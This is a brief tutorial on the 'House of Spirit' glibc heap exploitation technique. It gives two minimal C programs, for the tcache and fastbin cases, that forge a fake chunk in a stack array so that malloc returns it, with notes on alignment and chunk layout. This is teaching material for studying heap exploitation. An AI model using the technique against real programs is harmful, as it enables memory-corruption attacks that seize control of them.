# House of Spirit
> LongChampion, 13/03/2020

## with tcache (glibc >= 2.26)
This attack is quite simple, look at the code:
```
#include <stdlib.h>

int main()
{
    long long FAKE[4];
    void *ptr = malloc(0x10);
    ptr = &FAKE[2];
    FAKE[1] = 0x20;
    free(ptr);
    ptr = malloc(0x10);
}
```
## with fastbin (glibc <= 2.25)
To *hijack* fastbin, you need to create 2 chunks to bypass security check: `size` of chunk to be free must be equal to `size` of next chunk in memory.  
```
#include <stdlib.h>

int main()
{
    long long FAKE[6];
    void *ptr = malloc(0x10);
    ptr = &FAKE[2];
    FAKE[1] = 0x20;
    FAKE[5] = 0x20;
    free(ptr);
    ptr = malloc(0x10);
}
```
### Note:
- **THE MOST IMPORTANT**: `FAKE` (and all other chunks) must be aligned by `MALLOC_ALIGNMENT` (usually 16 bytes in x64 system, 8 bytes in x32 system). Your life may be destroy if you forget this. To make sure that `FAKE` is aligned, add `__attribute__` to it:
    > `long long FAKE[6] __attribute__((aligned(16))); // change 16 to 8 when compile in x86 system`

- The `PREV_INUSE` flag is ignored, but `IS_MMAPPED` flag and `NON_MAIN_ARENA` flag can cause problem!
- The memory layout is (use for both case):
    > | FAKE | chunk           |
    > |------|-----------------|
    > | 0    | first.pre_size  |
    > | 1    | first.size      |
    > | 2    | first.fd        |
    > | 3    | first.bk        |
    > | 4    | second.pre_size |
    > | 5    | second.size     |
- In both case, `ptr` will point to `FAKE[2]` at the end (not point to `FAKE`)
- `FAKE` must have at least 4 elements (6 elements for fastbin) because when it is freed, the `fd` and `bk` pointer will be modified, this change can smash your stack frame!
- After `FAKE` is free, make sure that you call `malloc` with suitable request size so that it will return `FAKE[2]` to you.
- In the later case, make sure that distance between two chunks is equal to `size` (they are not adjacent on memory in general case)